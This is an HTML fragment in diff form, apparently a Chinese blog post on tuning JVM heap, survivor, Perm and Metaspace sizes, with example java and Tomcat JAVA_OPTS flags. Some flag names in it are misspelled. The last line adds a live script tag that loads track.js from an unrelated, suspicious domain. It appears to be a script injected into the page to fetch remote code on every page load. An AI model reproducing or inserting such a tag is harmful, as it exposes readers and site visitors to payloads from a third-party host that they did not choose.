+<div class="line number197 index196 alt2"><code class="csharp plain">　　使用-XX:MaxPerSize标志来增加永久域搭大小。在WebLogic Server应用程序加载较多类时，经常需要增加永久域的最大值。当jvm加载类时，永久域中的对象急剧增加，从而使jvm不断调整永久域大小。为了避免调整，可使用-XX:PerSize标志设置初始值。</code></div>
+<div class="line number198 index197 alt1"><code class="csharp plain">　　下面把永久域初始值设置成32m，最大值设置成64m。</code></div>
+<div class="line number199 index198 alt2"><code class="csharp plain">java -Xms512m -Xmx512m -Xmn128m -XX:PermSize=32m -XX:MaxPermSize=64m</code></div>
+<div class="line number200 index199 alt1"><code class="csharp plain">默认状态下，HotSpot在新域中使用复制收集器。该域一般分为三个部分。第一部分为Eden，用于生成新的对象。另两部分称为救助空间，当Eden充满时，收集器停止应用程序，把所有可到达对象复制到当前的</code><code class="csharp keyword">from</code><code class="csharp plain">救助空间，一旦当前的</code><code class="csharp keyword">from</code><code class="csharp plain">救助空间充满，收集器则把可到达对象复制到当前的to救助空间。From和to救助空间互换角色。维持活动的对象将在救助空间不断复制，直到它们获得使用期并转入旧域。使用-XX:SurvivorRatio可控制新域子空间的大小。</code></div>
+<div class="line number201 index200 alt2"><code class="csharp plain">　　同NewRation一样，SurvivorRation规定某救助域与Eden空间的比值。比如，以下命令把新域设置成64m，Eden占32m，每个救助域各占16m：</code></div>
+<div class="line number202 index201 alt1"><code class="csharp plain">java -Xms256m -Xmx256m -Xmn64m -XX:SurvivorRation =2</code></div>
+<div class="line number203 index202 alt2"><code class="csharp plain">　　如前所述，默认状态下HotSpot对新域使用复制收集器，对旧域使用标记－清除－压缩收集器。在新域中使用复制收集器有很多意义，因为应用程序生成的大部分对象是短寿命的。理想状态下，所有过渡对象在移出Eden空间时将被收集。如果能够这样的话，并且移出Eden空间的对象是长寿命的，那么理论上可以立即把它们移进旧域，避免在救助空间反复复制。但是，应用程序不能适合这种理想状态，因为它们有一小部分中长寿命的对象。最好是保持这些中长寿命的对象并放在新域中，因为复制小部分的对象总比压缩旧域廉价。为控制新域中对象的复制，可用-XX:TargetSurvivorRatio控制救助空间的比例（该值是设置救助空间的使用比例。如救助空间位1M，该值50表示可用500K）。该值是一个百分比，默认值是50。当较大的堆栈使用较低的sruvivorratio时，应增加该值到80至90，以更好利用救助空间。用-XX:maxtenuring threshold可控制上限。</code></div>
+<div class="line number204 index203 alt1"><code class="csharp plain">　　为放置所有的复制全部发生以及希望对象从eden扩展到旧域，可以把MaxTenuring Threshold设置成0。设置完成后，实际上就不再使用救助空间了，因此应把SurvivorRatio设成最大值以最大化Eden空间，设置如下：</code></div>
+<div class="line number205 index204 alt2"><code class="csharp plain">java … -XX:MaxTenuringThreshold=0 –XX:SurvivorRatio＝50000 …</code></div>
+<div class="line number206 index205 alt1"><code class="csharp plain">垃圾回收描述：</code></div>
+<div class="line number207 index206 alt2"><code class="csharp plain">垃圾回收分多级，0级为全部(Full)的垃圾回收，会回收OLD段中的垃圾；1级或以上为部分垃圾回收，只会回收Young中的垃圾，内存溢出通常发生于OLD段或Perm段垃圾回收后，仍然无内存空间容纳新的Java对象的情况。</code></div>
+<div class="line number208 index207 alt1"><code class="csharp plain">当一个URL被访问时，内存申请过程如下：</code></div>
+<div class="line number209 index208 alt2"><code class="csharp plain">A. JVM会试图为相关Java对象在Eden中初始化一块内存区域</code></div>
+<div class="line number210 index209 alt1"><code class="csharp plain">B. 当Eden空间足够时，内存申请结束。否则到下一步</code></div>
+<div class="line number211 index210 alt2"><code class="csharp plain">C. JVM试图释放在Eden中所有不活跃的对象（这属于1或更高级的垃圾回收）；释放后若Eden空间仍然不足以放入新对象，则试图将部分Eden中活跃对象放入Survivor区/OLD区</code></div>
+<div class="line number212 index211 alt1"><code class="csharp plain">D. Survivor区被用来作为Eden及OLD的中间交换区域，当OLD区空间足够时，Survivor区的对象会被移到Old区，否则会被保留在Survivor区</code></div>
+<div class="line number213 index212 alt2"><code class="csharp plain">E. 当OLD区空间不够时，JVM会在OLD区进行完全的垃圾收集（0级）</code></div>
+<div class="line number214 index213 alt1"><code class="csharp plain">F. 完全垃圾收集后，若Survivor及OLD区仍然无法存放从Eden复制过来的部分对象，导致JVM无法在Eden区为新对象创建内存区域，则出现”</code><code class="csharp keyword">out</code> <code class="csharp plain">of memory错误”</code></div>
+<div class="line number215 index214 alt2"><code class="csharp plain">Java堆相关参数：</code></div>
+<div class="line number216 index215 alt1"><code class="csharp plain">ms/mx：定义YOUNG+OLD段的总尺寸，ms为JVM启动时YOUNG+OLD的内存大小；mx为最大可占用的YOUNG+OLD内存大小。在用户生产环境上一般将这两个值设为相同，以减少运行期间系统在内存申请上所花的开销。</code></div>
+<div class="line number217 index216 alt2"><code class="csharp plain">NewSize/MaxNewSize：定义YOUNG段的尺寸，NewSize为JVM启动时YOUNG的内存大小；MaxNewSize为最大可占用的YOUNG内存大小。在用户生产环境上一般将这两个值设为相同，以减少运行期间系统在内存申请上所花的开销。</code></div>
+<div class="line number218 index217 alt1"><code class="csharp plain">PermSize/MaxPermSize：定义Perm段的尺寸，PermSize为JVM启动时Perm的内存大小；MaxPermSize为最大可占用的Perm内存大小。在用户生产环境上一般将这两个值设为相同，以减少运行期间系统在内存申请上所花的开销。</code></div>
+<div class="line number219 index218 alt2"><code class="csharp plain">SurvivorRatio：设置Survivor空间和Eden空间的比例</code></div>
+<div class="line number220 index219 alt1"><code class="csharp plain">例：</code></div>
+<div class="line number221 index220 alt2"><code class="csharp plain">MEM_ARGS=</code><code class="csharp string">"-Xms512m -Xmx512m -XX:NewSize=256m -XX:MaxNewSize=256m -XX:PermSize=128m -XX:MaxPermSize=128m -XX:SurvivorRatio=6"</code></div>
+<div class="line number222 index221 alt1"><code class="csharp plain">在上面的例子中：</code></div>
+<div class="line number223 index222 alt2"><code class="csharp plain">YOUNG+OLD: 512M</code></div>
+<div class="line number224 index223 alt1"><code class="csharp plain">YOUNG: 256M</code></div>
+<div class="line number225 index224 alt2"><code class="csharp plain">Perm: 128M</code></div>
+<div class="line number226 index225 alt1"><code class="csharp plain">Eden: YOUNG*6/(6+1+1)=192M</code></div>
+<div class="line number227 index226 alt2"><code class="csharp plain">Survivor: YOUNG/(6+1+1)=32M</code></div>
+<div class="line number228 index227 alt1"><code class="csharp plain">Java堆的总尺寸=YOUNG+OLD+Perm=640M</code></div>
+<div></div>
+<div><span style="color: #ff0000;">注意⚠️：</span>在JDK1.8中，取消了<strong>PermGen</strong>，取而代之的是<strong>Metaspace</strong>，所以PermSize和MaxPermSize参数失效，取而代之的是</div>
+<div>-<span class="ruby"><span class="hljs-constant">XX</span><span class="hljs-symbol">:MetaspaceSize=</span><span class="hljs-number">64</span>m -<span class="hljs-constant">XX</span><span class="hljs-symbol">:MaxMetaspaceSize=</span><span class="hljs-number">128</span>m</span></div>
+<div>
+<p>linux下：在tomcat的bin目录下编辑catalina.sh ，cygwin=false上面加入</p>
+<pre class="prettyprint">JAVA_OPTS=<span class="hljs-value"><span class="hljs-string">"-Xms1024m -Xmx2048m -Xss1024K -XX:MetaspaceSize=512m -XX:MaxMetaspaceSize=1024m"</span></span></pre>
+</div>
+<p><script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script></p>
